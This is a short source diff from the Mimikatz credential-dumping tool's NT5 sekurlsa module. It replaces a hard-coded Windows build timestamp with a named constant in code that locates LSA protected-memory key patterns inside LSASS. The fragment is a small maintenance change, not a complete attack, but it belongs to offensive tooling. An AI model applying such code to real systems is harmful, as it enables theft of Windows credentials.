@@ -54,7 +54,7 @@ NTSTATUS kuhl_m_sekurlsa_nt5_init()
 				sMemory.kull_m_memoryRange.kull_m_memoryAdress = vbInfos.DllBase;
 				sMemory.kull_m_memoryRange.size = vbInfos.SizeOfImage;
 				#ifdef _M_IX86
-				isOld = (MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_BUILD_2K3) && (vbInfos.TimeDateStamp < 0x45D71BC6);
+				isOld = (MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_BUILD_2K3) && (vbInfos.TimeDateStamp < KUHL_M_SEKURLSA_NT5_SP2_MIN_TIMESTAMP);
 				#endif
 
 				if(!kuhl_m_sekurlsa_nt5_pLsaUnprotectMemory)
@@ -135,7 +135,7 @@ NTSTATUS kuhl_m_sekurlsa_nt5_acquireKeys(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKULL_
 #ifdef _M_X64
 	LONG offset64;
 #elif defined _M_IX86
-	if((cLsass->osContext.BuildNumber >= KULL_M_WIN_BUILD_2K3) && (lsassLsaSrvModule->TimeDateStamp < 0x45D71BC6))
+	if((cLsass->osContext.BuildNumber >= KULL_M_WIN_BUILD_2K3) && (lsassLsaSrvModule->TimeDateStamp < KUHL_M_SEKURLSA_NT5_SP2_MIN_TIMESTAMP))
 	{
 		aLocalMemory.address = PTRN_WNT5_old_LsaInitializeProtectedMemory_KEY;
 		sizeOfSearch = sizeof(PTRN_WNT5_old_LsaInitializeProtectedMemory_KEY);
